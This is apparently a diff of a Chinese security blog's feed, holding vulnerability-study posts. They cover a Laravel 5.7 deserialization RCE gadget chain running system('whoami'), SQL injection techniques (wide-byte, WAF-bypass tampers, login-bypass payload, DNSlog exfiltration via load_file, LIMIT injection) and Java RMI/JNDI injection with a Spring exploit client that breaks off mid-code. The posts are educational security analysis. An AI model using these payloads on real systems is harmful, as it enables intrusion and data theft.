<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("<span class="title">hello</span>" =&gt; "<span class="title">world</span>"));</span><br><span class="line"></span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line"></span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>最后贴上利用截图<br><img src="exp.png" alt="exp"></li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>这个反序列化RCE重要的点：<ul>
+<li>在进入run()函数，运行到call()前，需要bypass<code>mockConsoleOutput()</code>和<code>mockConsoleOutput()</code>，由于某个属性的不存在，我们需要魔法函数<code>__get()</code>返回数组来顺利运行下文的代码</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>Laravel5.7</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于sql注入</title>
+    <url>/2019/11/25/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>宽字节注入，bypass，dnslog注入，limit注入</p>
+<a id="more"></a>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入是由于转编码而形成的，那具有转编码功能的函数也成了漏洞的成因。</p>
+<h2 id="UTF8"><a href="#UTF8" class="headerlink" title="UTF8"></a>UTF8</h2><p>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF（Universal Transformation Format）。</p>
+<h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。</p>
+<blockquote>
+<p>GB2312是被GBK兼容的，它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE（0x5C不在该范围内），因此不能使用编码吃掉%5c。<br>其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。</p>
+</blockquote>
+<ul>
+<li><strong>宽字节注入与HTML页面编码是无关的</strong><br>宽字节对转义字符的影响发生在<code>character_set_client=gbk</code>的情况，也就是说，如果<strong>客户端发送的数据字符集是<code>gbk</code></strong>，则可能会吃掉转义字符<code>\</code>，从而导致转义失败。</li>
+<li>使用了<code>addslashes</code>函数<br>GBK编码，它的编码范围是0x8140~0xFEFE（不包括<code>0xxx7F</code>），在遇到<code>%df:(ascii(223)) &gt;ascii(128)</code>时自动拼接%5c，因此吃掉‘\’，而%27、%20小于ascii(128)的字符就保留了。<br><code>%df%27</code>，会把它看成一个汉字，但是%27会闭合前面的单引号</li>
+</ul>
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="HPP："><a href="#HPP：" class="headerlink" title="HPP："></a>HPP：</h2><p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。假设提交的参数即为：<br><code>id=1&amp;id=2&amp;id=3</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">解析结果</span><br><span class="line">Asp.net + iis：id=1,2,3</span><br><span class="line">Asp + iis：id=1,2,3</span><br><span class="line">Php + apache：id=3</span><br></pre></td></tr></table></figure>
+<h2 id="sqlmap的各种bypass-waf-tamper："><a href="#sqlmap的各种bypass-waf-tamper：" class="headerlink" title="sqlmap的各种bypass waf tamper："></a>sqlmap的各种bypass waf tamper：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>
+<h2 id="mysql用户自定义变量"><a href="#mysql用户自定义变量" class="headerlink" title="mysql用户自定义变量"></a>mysql用户自定义变量</h2><ul>
+<li>可以先在用户变量中保存值然后在以后引用它；这样可以将值从一个语句传递到另一个语句。用户变量与连接有关。也就是说，一个客户端定义的变量不能被其它客户端看到或使用。当客户端退出时，该客户端连接的所有变量将自动释放。</li>
+<li>用户变量的形式为@var_name，其中变量名var_name可以由当前字符集的文字数字字符、‘.’、‘_’和‘$’组成。 默认字符集是cp1252 (Latin1)。可以用mysqld的<code>--default-character-set</code>选项更改字符集。用户变量名对大小写不敏感。</li>
+</ul>
+<p><strong>设置用户变量的一个途径是执行SET语句</strong><br><code>SET @var_name = expr [, @var_name = expr] ...</code></p>
+<ul>
+<li>对于SET，可以使用<code>=</code>或<code>:=</code>作为分配符。分配给每个变量的expr可以为整数、实数、字符串或者NULL值。</li>
+<li>也可以用语句代替SET来为用户变量分配一个值。在这种情况下，分配符必须为<code>:=</code>而不能用<code>=</code>，因为在非SET语句中<code>=</code>被视为一个比较 操作符：<h2 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h2>过滤单引号<br>  username 输入<code>1\</code><br>  password 输入<code>or 1=1;#</code><br>sql:<code>select * form user_table where username = &#39;1\&#39; and password = &#39;or 1=1;#&#39;</code><br>username中输入的\转义了它后面的单引号，所以此时<code>username =&#39;1\ and password = &#39;</code>，后面的<code>or 1=1;</code>就生效了<h2 id="sql语句中空格的代替方法"><a href="#sql语句中空格的代替方法" class="headerlink" title="sql语句中空格的代替方法"></a>sql语句中空格的代替方法</h2></li>
+<li>过滤空格<br>url编码为：<code>%20</code>，双写为<code>%2%200</code><br>也可写作<code>%a0</code><br>常见的绕过空格的就是多行注释<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*!50540select user()*/             mysql(独有)内联注释,!后面的数字是版本号，表示当数据库版本&gt;=5.5.40时执行SQL语句(版本号五位)</span><br><span class="line">/**/                                mysql多行注释</span><br><span class="line">%09,%0a,%0b,%0c,%0d,%20,%a0         一些空白字符</span><br><span class="line">1.1、2.3、1.                        浮点数形式</span><br><span class="line">0e1、1e7                            科学计数法</span><br><span class="line">+、-、!、@、~、&#123;&#125;、&quot;、&apos;、()、``      一些特殊字符</span><br></pre></td></tr></table></figure>
+<h1 id="SQL注入之基于DNS的注入-DNSlog注入"><a href="#SQL注入之基于DNS的注入-DNSlog注入" class="headerlink" title="SQL注入之基于DNS的注入(DNSlog注入)"></a>SQL注入之基于DNS的注入(DNSlog注入)</h1>测试一些网站的时候，一些注入都是无回显的，我们可以写脚本来进行盲注，但有些网站会ban掉我们的ip，这样我们可以通过设置ip代理池解决，但是盲注往往效率很低，所以产生了DNSlog注入。</li>
+<li>dns在递归查询时，会在dns服务器上保存log，所有经过dns服务器以及其子域名的查询都会在上面留下记录</li>
+<li>load_file()不仅可以读取本地文件，也可以对<code>\\example.com</code>这样的url发起请求</li>
+</ul>
+<ol>
+<li>show variables like ‘%secure%’查看load_file()可以读取的磁盘。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv为空，就可以读取磁盘的目录。</span><br><span class="line"></span><br><span class="line">secure_file_priv为D:\wamp\tmp，就可以读取G盘下wamp\tmp的文件。</span><br><span class="line"></span><br><span class="line">secure_file_priv为null，load_file就不能加载文件。</span><br></pre></td></tr></table></figure></li>
+<li>通过更改mysql配置文件<code>my.ini</code>,设置secure_file_priv=””就是可以load_flie任意磁盘的文件。</li>
+</ol>
+<ul>
+<li>我们可以使用dnslog平台或者自己搭建dns服务器，假设dnslog平台给你分配了一个三级级域名：<code>abc.dns.com</code>，如果查询三级域名<code>xxx.abc.dns.com</code>，就会在dns服务器中留下记录,我们可以将payload写在第四级域名的位置</li>
+<li>在mysql中执行<code>select load_file(concat(&#39;\\\\&#39;,[payload],&#39;.abc.dns.com\\\aaa&#39;));</code>(‘&#39;会被转义，所以需要+上一个’&#39;)，payload的执行结果会被显示在第四级域名的位置，使用concat函数将(select database())得到的内容作为查询url的一部分，和我们的平台三级域名拼接组合成一个四级域名，而load_file函数会通过dns解析请求，所以我们在dnslog平台就可以看到查询的记录(包含着我们注入出的数据)</li>
+<li>对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。<h1 id="Limit-注入"><a href="#Limit-注入" class="headerlink" title="Limit 注入"></a>Limit 注入</h1></li>
+</ul>
+<p>此方法适用于<code>5.0.0&lt;mysql&lt;5.6.6</code>中<br>select语句：<code>select id from t1 where num=123333 order by id limit 1,1</code><br>在select语法中，limit后面可以跟两个函数<code>PROCEDURE</code> 和 <code>INTO</code>，<code>INTO</code>除非有写入shell的权限，否则是无法利用的<br>使用procedure analyse进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</span><br></pre></td></tr></table></figure>
+<p>基于时间：<br><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Java RMI学习</title>
+    <url>/2020/06/27/Java%20RMI%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是一个学习Java反序列化漏洞的一个入门文章，总结学习Java RMI调用以及一个Spring JNDI注入与反序列化漏洞原理</p>
+<a id="more"></a>
+
+<h1 id="Java-RMI的定义"><a href="#Java-RMI的定义" class="headerlink" title="Java RMI的定义"></a>Java RMI的定义</h1><p>Java远程方法调用，即Java RMI (Java Remote Method Invocation)，是Java编程语言里，一种用于<strong>实现远程过程调用的应用程序编程接口</strong>。它使客户机上运行的程序可以直接调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。</p>
+<p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
+<p>在RMI中<strong>对象是通过序列化方式进行编码传输的</strong>。（基于序列化和反序列化就可能存在反序列化漏洞了）<br><strong>RMI的基础是接口，RMI构架基于一个重要的原理：定义接口和<em>定义接口的具体</em>实现是分开的。</strong></p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>RMI能让一个Java程序去调用网络中另一台计算机的Java对象的方法，那么调用的效果就像是在本机上调用一样。通俗的讲：A机器上面有一个class，通过远程调用，B机器调用这个class 中的方法。</p>
+<h2 id="RMI包含部分："><a href="#RMI包含部分：" class="headerlink" title="RMI包含部分："></a>RMI包含部分：</h2><ol>
+<li>远程服务的接口定义</li>
+<li>远程服务接口的具体实现</li>
+<li>存根（Stub）和骨架（Skeleton）文件</li>
+<li>一个运行远程服务的服务器</li>
+<li>一个RMI命名服务，它允许客户端去发现这个远程服务</li>
+<li>类文件的提供者（一个HTTP或者FTP服务器）</li>
+<li>一个需要这个远程服务的客户端程序<h1 id="Java-RMI示例"><a href="#Java-RMI示例" class="headerlink" title="Java RMI示例"></a>Java RMI示例</h1><h2 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h2>远程方法调用是分布式编程中的一个基本思想。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过<strong>序列化方式</strong>进行编码传输的。<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2></li>
+<li>首先我们定义一个远程接口<code>Clock.java</code><ul>
+<li>定义远程服务接口（interface）</li>
+<li>远程接口必须继承Remote</li>
+<li>远程方法必须抛出RemoteException<blockquote>
+<p>在Java中，只要一个类extends了java.rmi.Remote接口，即可成为存在于服务器端的远程对象， 供客户端访问并提供一定的服务。JavaDoc描述：Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口” 扩展 java.rmi.Remote 的接口）中指定的这些方法才可被远程调用</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ol>
+<p><img src="./Clock.png" alt="Clock.java"><br>2. 接下来定义远程接口的实现<code>ClockImpl.java</code><br><img src="./ClockImpl.png" alt="ClockImpl.java"></p>
+<blockquote>
+<ul>
+<li>远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，</li>
+<li>该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为”stub”(存根)，</li>
+<li>而服务器端本身已存在的远程对象则称之为”Skeleton”(骨架)。其实此时的存根是客户端的一个代理，用于与服务器端的通信，</li>
+<li>而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。</li>
+</ul>
+</blockquote>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol>
+<li>根据主机和端口，获得服务注册器的引用</li>
+<li>注册器根据服务名称查找对应的服务，并返回给客户端（Stub—-客户端代理）</li>
+<li>客户对象通过Stub发送请求</li>
+<li>Stub将调用信息（变量、方法名称等）打包，通过网络将它发送给Skeleton（服务辅助对象）</li>
+<li>Skeleton将来自Stub的信息解包，找出被调用的方法（以及在哪个对象内），然后调用真正的服务对象上的真正方法</li>
+<li>服务对象执行方法，获得返回结果，并将结果返回给Skeleton</li>
+<li>Skeleton将返回结果打包，通过网络返回给Stub（注意返回结果必须是可序列化的）</li>
+<li>Stub接受到数据后解包，返回给客户对象。</li>
+<li>客户端所在的JVM启动后，可以多次调用服务端对象的方法。<blockquote>
+<p>stub和skeleton代理都是在服务端程序中由RMI系统动态生成,服务端程序只需要继承java.rmi.server.UnicastRemoteObject类即可</p>
+</blockquote>
+<h2 id="如何获取Stub"><a href="#如何获取Stub" class="headerlink" title="如何获取Stub"></a>如何获取Stub</h2></li>
+<li>调用某个远程服务上的方法，向远程服务获取存根<br>JDK提供了一个RMI注册表（RMIRegistry），RMIRegistry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。</li>
+</ol>
+<ul>
+<li>要注册远程对象，需要RMI URL和一个远程对象的引用。</li>
+<li><code>LocateRegistry.getRegistry()</code>会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建Clock实例</span></span><br><span class="line">Clock impl = <span class="keyword">new</span> ClockImpl();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">registry.bind(<span class="string">"Clock"</span>,stub);</span><br></pre></td></tr></table></figure>
+从客户端角度来看服务端，服务端开启了两个端口，一个是RMI注册端口默认为1099，另一个是远程对象通信端口，由JVM随机分配，</li>
+<li>客户端代码<code>ClockClient.java</code><br><img src="./ClockClient.png" alt="ClockClient.java"></li>
+</ul>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>Clock是暴露在网络中的接口，ClockImpl是一个服务端远程对象，重写了一个Hello方法供远程调用。它没有继承UnicastRemoteObject类，我们可以在构造方法中调用<code>UnicastRemoteObject.exportObject()</code>例如：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClockImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">    UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">1099</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>也可以稍后在服务端代码中调用</p>
+<ul>
+<li>服务端代码<code>ClockServer.java</code><br><img src="./ClockServer.png" alt="ClockServer.java"><blockquote>
+<p>注册远程对象,向客户端提供远程对象服务远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称。但是，将远程对象注册到RMI Service之后，客户端就可以通过RMI Service请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了</p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li>服务端的流程是：</li>
+</ul>
+<ol>
+<li>定义远程服务接口（interface）</li>
+<li>定义远程服务接口的具体实现（implement）</li>
+<li>将该远程服务注册到RMI命名服务上（指定主机及端口）（registry）</li>
+<li>启动远程服务所在的jvm线程，此时服务端处于运行中。</li>
+</ol>
+<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h1><ol>
+<li>先运行服务端<br><img src="./server.png" alt="server"></li>
+<li>运行客户端，调用成功<br><img src="./client.png" alt="client"></li>
+</ol>
+<h1 id="总结一下RMI-流程"><a href="#总结一下RMI-流程" class="headerlink" title="总结一下RMI 流程"></a>总结一下RMI 流程</h1><ol>
+<li>服务端ClockImpl()继承Clock()创建远程对象</li>
+<li>服务端CLock()注册远程对象</li>
+<li>客户端访问服务器b并查找相应远程对象</li>
+<li>服务端将stub(存根返回)客户端</li>
+<li>客户端调用stub(存根)的方法</li>
+<li>stub(存根)作为代理与服务端骨架通信   //骨架作为服务端代理</li>
+<li>骨架代理调用ClockImpl相应方法</li>
+<li>骨架将结果返回给客户端的存根</li>
+<li>存根返回给客户端<br><img src="./%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.jpg" alt="RMI体系结构"></li>
+</ol>
+<h1 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h1><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>
+<ul>
+<li><strong>JNDI注入的利用方法中也借助了动态加载类的思路</strong>。</li>
+<li>这里涉及到的角色：客户端、RMI注册表、远程对象服务器、托管class文件的Web服务器可以分别位于不同的主机上：<br><img src="./%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%B1%BB.png" alt="动态加载类"><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1>JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层<strong>支持RMI远程对象</strong>，RMI注册的服务可以通过JNDI接口来访问和调用。</li>
+<li>其实JNDI就如同Windows系统的注册表一样:<code>键:值</code><br><img src="./JNDI.png" alt="JNDI"><blockquote>
+<p>JNDI：<code>路径+名称:对象名称</code><br>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
+</blockquote>
+</li>
+<li>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果<code>lookup()</code>的参数可控就可能被攻击。<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过<code>References</code>类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。</li>
+<li>利用流程</li>
+</ul>
+<ol>
+<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://evil.com//name；</li>
+<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
+<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果.<br>攻击目标扮演的相当于是JNDI客户端的角色，攻击者通过搭建一个恶意的RMI服务端来实施攻击。</li>
+</ol>
+<h1 id="Spring-JNDI注入与反序列化"><a href="#Spring-JNDI注入与反序列化" class="headerlink" title="Spring JNDI注入与反序列化"></a>Spring JNDI注入与反序列化</h1><p>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，其中lookup()参数可控导致了RCE。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境使用的是Github上<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">zerothoughts</a>提供的POC，主要功能就是一个简单的Client、Server端，运行在Spring环境下。</p>
+<ul>
+<li>其中Server端开启一个Socket连接，读取Client发送的序列化数据，然后反序列化得到对象</li>
+<li>Client负责发送序列化数据以及实现一个JNDI注入来加载恶意类<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中，当进行对象反序列化的时候，会执行lookup()操作而且参数可控，可以进行JNDI注入。<h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String serverAddress = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            String localAddress= args[<span class="number">2</span>];</span><br><span class="line">            <span class="comment">//启动web server，提供远程下载要调用类的接口</span></span><br><span class="line">            System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">            HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8088</span>), <span class="number">0</span>);</span><br><span class="line">            httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">            httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">            httpServer.start();</span><br><span class="line">            <span class="comment">//下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class</span></span><br><span class="line">            System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8088/"</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">            Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">            System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">            <span class="comment">//jndi的调用地址</span></span><br><span class="line">            String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line">            org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">            object.setUserTransactionName(jndiAddress);</span><br><span class="line">            <span class="comment">//发送payload</span></span><br><span class="line">            